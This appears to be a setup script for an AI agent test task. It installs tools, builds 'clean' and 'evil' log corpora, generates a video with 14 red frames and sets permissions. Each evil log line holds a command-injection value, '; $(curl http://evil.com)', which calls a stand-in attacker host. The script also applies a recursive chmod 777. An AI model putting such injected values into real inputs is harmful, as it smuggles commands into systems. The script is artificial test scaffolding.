#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip ffmpeg
    pip3 install pytest

    # Create directories
    mkdir -p /home/user/netmon_config
    mkdir -p /home/user/.config/systemd/user
    mkdir -p /app/corpus/clean
    mkdir -p /app/corpus/evil

    # Populate clean corpus
    for i in $(seq 1 10); do
        echo "[2023-10-24 10:15:32] Interface eth0 state changed to UP log $i" > /app/corpus/clean/log_$i.txt
    done

    # Populate evil corpus
    for i in $(seq 1 10); do
        echo "[2023-10-24 10:15:33] Interface eth0 state changed to UP ; \$(curl http://evil.com) log $i" > /app/corpus/evil/log_$i.txt
    done

    # Generate video with exactly 14 red frames
    mkdir -p /tmp/frames
    ffmpeg -f lavfi -i color=c=red:s=320x240 -vframes 1 /tmp/red.png
    ffmpeg -f lavfi -i color=c=black:s=320x240 -vframes 1 /tmp/black.png

    for i in $(seq 1 300); do
        if [ $i -le 14 ]; then
            cp /tmp/red.png /tmp/frames/frame_$(printf "%03d" $i).png
        else
            cp /tmp/black.png /tmp/frames/frame_$(printf "%03d" $i).png
        fi
    done

    ffmpeg -framerate 30 -i /tmp/frames/frame_%03d.png -c:v libx264 -pix_fmt yuv420p /app/switch_monitor.mp4
    rm -rf /tmp/frames /tmp/red.png /tmp/black.png

    # Create .bashrc
    touch /home/user/.bashrc

    # Create user and set permissions
    useradd -m -s /bin/bash user || true
    chown -R user:user /home/user /app
    chmod -R 777 /home/user /app
